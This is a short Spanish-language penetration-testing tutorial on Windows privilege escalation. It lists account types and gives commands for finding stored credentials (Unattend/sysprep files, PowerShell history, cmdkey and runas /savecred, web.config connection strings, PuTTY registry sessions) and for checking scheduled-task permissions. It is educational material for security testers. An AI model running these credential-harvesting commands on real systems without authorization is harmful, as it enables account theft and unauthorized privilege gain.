<h1 align="center"> Windows Escala Privilegios </h1>

# INTRODUCCIÓN

Como penetration tester, también nos tocara acceder a sistemas Windows,

La escala de privilegios consiste en ganar acceso del usuario a y ganar acceso al usuario b abusando de una vulnerabilidad siendo por ejemplo el usuario b el adminstrador.


- Malas configuraciones de windows o servicios
- Exceso de privilegios añadidos a la cuenta
- Software vulnerable
- Parches de configuración de windows no instalados

# USUARIOS de Windows

Administrators - usuario con más privilegios
Standard Users - Usuarios que tienen acceso al ordenador por limitaciones

SYSTEM / LocalSystem - Cuenta usada por el sistema operativo para tareas internas
Local Service - Cuenta por defecto para ejecutar servicios con minimos privilegios
Netwok Service - Cuenta de iwndows por defecto para ejecutar privilegios minimos

# Encontrar contraseñas en Spots Usuales

La forma mas facl de ganar acceso a una máquina es una mala configuracion o texto plano de los usuarios, emails o contraseñas

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

![image](https://github.com/user-attachments/assets/342006d1-27ab-4e40-859c-ff96fee06704)

## powershell history

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Credenciales guardadas en windows

```
cmdkey /list
runas /savecred /user:admin cmd.exe
```

## IIS configuracion

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Devolver credenciales por software : Putty

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

# TAREAS PROGRAMADAS

Vemos las tareas programas y a ver si podemos modificarlas

```
schtasks /query /tn vulntask /fo list /v
```

```
icacls
```


